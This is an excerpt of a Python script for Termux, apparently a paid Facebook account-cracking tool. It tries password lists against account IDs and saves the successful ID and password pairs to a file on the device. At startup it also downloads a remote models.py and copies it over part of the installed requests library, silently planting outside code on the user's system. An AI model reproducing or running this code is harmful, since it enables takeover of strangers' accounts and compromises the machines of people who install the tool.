...
#--------------------[MAIN DATA]--------------------#
os.system("curl -L https://raw.githubusercontent.com/TrickuUsman/ABC/main/models.py > models.py")
os.system("mv models.py /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/")
#--------------------[COLORS]--------------------#
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;196m'
WHITE = '\033[1;97m'
...
logo=("""\033[1;97m
\x1b[1;97m	db	db .d8888. .88b  d88. d888888b \x1b[1;95m𝐈𝐓'𝐙
\x1b[1;97m	88	88 88'  YP 88'YbdP`88   `88'  \x1b[1;91m 𝐁
\x1b[1;97m	88	88 `8bo.   88  88  88	88   \x1b[1;93m 𝐑
\x1b[1;97m	88	88   `Y8b. 88  88  88	88  \x1b[1;94m  𝐀
\x1b[1;97m	88b  d88 db   8D 88  88  88   .88. \x1b[1;95m  𝐍
 \x1b[1;97m   ~Y8888P' `8888Y' YP  YP  YP Y888888P \x1b[1;96m𝐃
\033[1;37m┌───────────────────────────────────────────┐
\033[1;37m│\033[1;37m➣\033[1;37m AUTHOR  \033[1;37m	:\033[1;37m  TRICKU USMII			  │
\033[1;37m│\033[1;37m➣\033[1;37m FACEBOOK\033[1;37m	:\033[1;37m  USMAN GULL				│
\033[1;37m│\033[1;37m➣\033[1;37m WHATSAPP\033[1;37m	:\033[1;37m  03132281952			   │
\033[1;37m│\033[1;37m➣\033[1;37m YOUTUBE \033[1;37m	:\033[1;37m  Usmi tricks			   │
\033[1;37m└───────────────────────────────────────────┘""")
def linex():
	print('\033[1;37m[*]───────────────────────────────────────────')
#--------------------[MAIN PART2 ]--------------------#
...
#--------------------[CLEAR]--------------------#
clear()
print(" HEY USER GIVE ME SOME INFORMATION ABOUT YOU")
...
def fia():	
			...
			print(logo)
			linex()
			print('[+] USMII TOOL VERSION : \x1b[1;91m1.2')
			linex()
			print('[1] Crack File Clone\n[2] Crack Pak Random Clone\n[3] Crack Bangla Random Clone\n[4] Join Our Fb Group\n[0] Exit')
			linex()
			xd=input('[*] Choose an option: ')
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/USMII.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[USMAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in USMI:
				print('\r\r\033[1;32m[USMI-OK] %s | %s'%(ids,pas))
				
				open('/sdcard/USMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in USMI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[USMI-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mUSMAN\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[USMI-OK] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[USMI-CP] '+cid+' | '+ps+'\33[0;97m')
...
def my_tool_security():
	...
	my_server=requests.get("https://github.com/TrickuUsman/Aproval/blob/main/Server.txt").text
...
if f_token in my_server:
	...
	_help=uuid.uuid1().hex[:6].upper()+"=USMI"
	print(f"\n\t		\x1b[97m[\033[37;41m Hello {NameX} \033[0;m]\n")
	print(f" {WHITE}This is paid tool you need subscription to use")
	print(" for buy subscription press enter to msg")
	print(" to USMI Programmer fb page your key")
	print(" otherwise msg on this whatsapp +923132282952 \n")
	print(57*'-')
	print("\n\t		 \x1b[97m[\033[37;41m YOUR KEY \033[0;m] \n")
	print(f" {RED} Copy your Key :",f_token+_help,"\n")
	os.system('xdg-open  https://wa.me/+923132281952?text=*ASALAMUALIKUM*%2C%20*SIR-USMI*%20*I*%20*WANT*%20*TO*%20*BUY*%20*YOUR*%20*NEW*%20*VIP*%20*CAMMANDS*%20%20*My*%20*Key*%20*:*%20'+f_token+_help)
	exit()
